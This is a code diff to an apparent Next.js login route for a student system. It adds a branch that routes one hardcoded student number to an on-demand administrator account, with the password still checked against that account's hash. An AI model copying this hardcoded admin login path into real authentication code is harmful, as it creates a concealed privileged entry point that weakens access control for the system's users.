@@ -1,4 +1,4 @@
-import { ensureDefaultClass } from "@/lib/bootstrap";
+import { ensureAdminAccount, ensureDefaultClass } from "@/lib/bootstrap";
 import { verifyPassword } from "@/lib/password";
 import { prisma } from "@/lib/prisma";
 import { clientIpFromRequest, rateLimit } from "@/lib/rate-limit";
@@ -35,17 +35,33 @@ export async function POST(req: NextRequest) {
     }
 
     const { studentNo, password } = parsed.data;
-    const user = await prisma.user.findUnique({
-      where: { studentNo },
-      select: {
-        id: true,
-        passwordHash: true,
-        approved: true,
-        role: true,
-        name: true,
-        classId: true,
-      },
-    });
+    const user =
+      studentNo === "240153484"
+        ? await (async () => {
+            const admin = await ensureAdminAccount();
+            return prisma.user.findUnique({
+              where: { id: admin.id },
+              select: {
+                id: true,
+                passwordHash: true,
+                approved: true,
+                role: true,
+                name: true,
+                classId: true,
+              },
+            });
+          })()
+        : await prisma.user.findUnique({
+            where: { studentNo },
+            select: {
+              id: true,
+              passwordHash: true,
+              approved: true,
+              role: true,
+              name: true,
+              classId: true,
+            },
+          });
     if (!user || !verifyPassword(password, user.passwordHash)) {
       return NextResponse.json({ error: "学号或密码错误" }, { status: 401 });
     }
